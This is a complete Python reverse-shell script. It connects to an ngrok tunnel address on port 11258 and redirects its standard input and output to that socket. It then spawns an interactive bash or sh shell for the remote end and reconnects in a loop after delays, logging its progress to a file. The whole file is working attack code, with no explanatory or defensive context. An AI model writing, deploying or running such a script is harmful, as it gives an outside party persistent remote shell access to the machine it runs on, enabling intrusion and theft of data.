import os
import pty
import time
import socket

HOST = "0.tcp.in.ngrok.io"
PORT = 11258

DELAY = 10

LOG = True

def main():
    if LOG:
        with open("log.txt", "w") as f:
            f.write("Reverse shell started\n")

    while True:
        if LOG:
            with open("log.txt", "a") as f:
                f.write("Connecting to {}:{}\n".format(HOST, PORT))

        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((HOST, PORT))

                if LOG:
                    with open("log.txt", "a") as f:
                        f.write("Connected\n")

                for fd in (0, 1, 2):
                    os.dup2(s.fileno(), fd)

                try:
                    pty.spawn("bash")

                except:
                    pty.spawn("sh")

                if LOG:
                    with open("log.txt", "a") as f:
                        f.write("Disconnected\n")

                time.sleep(DELAY * 6)

        except:
            time.sleep(DELAY)


if __name__ == "__main__":
    main()
